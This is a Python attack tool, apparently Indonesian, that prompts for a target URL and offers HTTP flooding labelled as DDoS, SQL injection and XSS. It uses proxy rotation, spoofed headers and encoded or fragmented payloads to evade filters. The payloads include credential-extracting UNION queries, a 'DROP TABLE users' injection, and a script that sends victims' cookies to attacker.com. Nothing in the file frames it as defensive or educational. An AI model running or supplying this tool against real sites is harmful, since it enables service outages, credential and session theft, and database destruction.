import requests
import random
import string
import logging
import time
import base64
import urllib.parse
import itertools

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

PROXIES = [
    {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
    {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=3):
    time.sleep(random.randint(min_delay, max_delay))

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
        'X-Requested-With': 'XMLHttpRequest'
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request gagal: {e}")
        return None

def obfuscate_payload(payload):
    base64_payload = base64.b64encode(payload.encode()).decode()
    url_encoded_payload = urllib.parse.quote(payload)
    return base64_payload, url_encoded_payload

def double_url_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def fragment_payload(payload):
    return [payload[i:i+5] for i in range(0, len(payload), 5)]

def flood_target(url, session, number_of_requests):
    for _ in range(number_of_requests):
        try:
            response = send_request(url, session, proxy=get_random_proxy())
            if response and response.status_code >= 500:
                logging.info("Target mungkin mengalami kegagalan: Server error 5xx")
        except Exception as e:
            logging.error(f"Request gagal: {e}")

def sql_injection(url, session):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND SLEEP(5) --",
        "' OR 1=1 LIMIT 1 --",
        "' AND 1=1 UNION SELECT username, password FROM users --",
        "'; DROP TABLE users --"
    ]
    
    for payload in payloads:
        base64_payload, url_encoded_payload = obfuscate_payload(payload)
        double_encoded_payload = double_url_encode(payload)
        fragments = fragment_payload(payload)
        
        for obfuscated_payload in [base64_payload, url_encoded_payload, double_encoded_payload] + fragments:
            response = send_request(url + obfuscated_payload, session)
            if response and "error" in response.text.lower():
                logging.info(f"Potensi celah SQL Injection ditemukan dengan payload: {obfuscated_payload}")

def xss_attack(url, session):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
    ]
    
    for payload in payloads:
        base64_payload, url_encoded_payload = obfuscate_payload(payload)
        double_encoded_payload = double_url_encode(payload)
        fragments = fragment_payload(payload)
        
        for obfuscated_payload in [base64_payload, url_encoded_payload, double_encoded_payload] + fragments:
            response = send_request(url + obfuscated_payload, session)
            if response and payload in response.text:
                logging.info(f"Potensi celah XSS ditemukan dengan payload: {obfuscated_payload}")

def main():
    url = input("Masukkan URL target: ")
    session = create_session()
    logging.info(f"Mulai melakukan serangan pada {url}")

    while True:
        print(f"{Y}Pilih jenis serangan:{N}")
        print("{R}1{G}. Flooding (DDoS)")
        print("{R}2{G}. SQL Injection")
        print("{R}3{G}. XSS ")
        print("0. Keluar")
        
        choice = input("Pilih opsi: ")

        if choice == "1":
            flood_target(url, session, 100)
        elif choice == "2":
            sql_injection(url, session)
        elif choice == "3":
            xss_attack(url, session)
        elif choice == "0":
            print("Keluar dari program...")
            break
        else:
            print(f"{R}Pilihan tidak valid!{N}")

if __name__ == "__main__":
    main()
